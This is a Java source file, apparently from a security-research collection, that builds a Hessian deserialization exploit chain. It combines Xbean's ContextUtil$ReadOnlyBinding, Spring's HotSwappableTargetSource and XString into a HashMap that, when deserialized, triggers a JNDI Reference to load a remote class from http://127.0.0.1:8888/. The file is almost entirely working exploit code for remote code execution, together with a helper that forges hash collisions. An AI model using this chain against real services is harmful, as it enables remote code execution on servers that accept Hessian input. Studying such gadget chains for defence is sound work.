package org.dili.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.xbean.naming.context.WritableContext;
import org.springframework.aop.target.HotSwappableTargetSource;
import javax.naming.Context;
import javax.naming.Reference;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.HashMap;

public class XbeanHessian {
    public static void main(String[] args) throws Exception {
        String refAddr = "http://127.0.0.1:8888/";
        String refClassName = "test";

        Reference ref = new Reference(refClassName, refClassName, refAddr);
        WritableContext writableContext = new WritableContext();

        // 创建ReadOnlyBinding对象
        String classname = "org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding";
        Object readOnlyBinding = Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class).newInstance("aaa", ref, writableContext);
        // String str = unhash(readOnlyBinding.hashCode());

        // 创建XString
        XString xString = new XString("bbb");

        HotSwappableTargetSource targetSource1 = new HotSwappableTargetSource(readOnlyBinding);
        HotSwappableTargetSource targetSource2 = new HotSwappableTargetSource(xString);

        //创建HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(targetSource1, "111");
        hashMap.put(targetSource2, "222");

        // 序列化
        FileOutputStream fileOutputStream = new FileOutputStream("JavaSec/out/XbeanHessian.bin");
        Hessian2Output hessian2Output = new Hessian2Output(fileOutputStream);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(hashMap);
        hessian2Output.close();

        // 反序列化
        FileInputStream fileInputStream = new FileInputStream("JavaSec/out/XbeanHessian.bin");
        Hessian2Input hessian2Input = new Hessian2Input(fileInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();

    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }
    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }
}
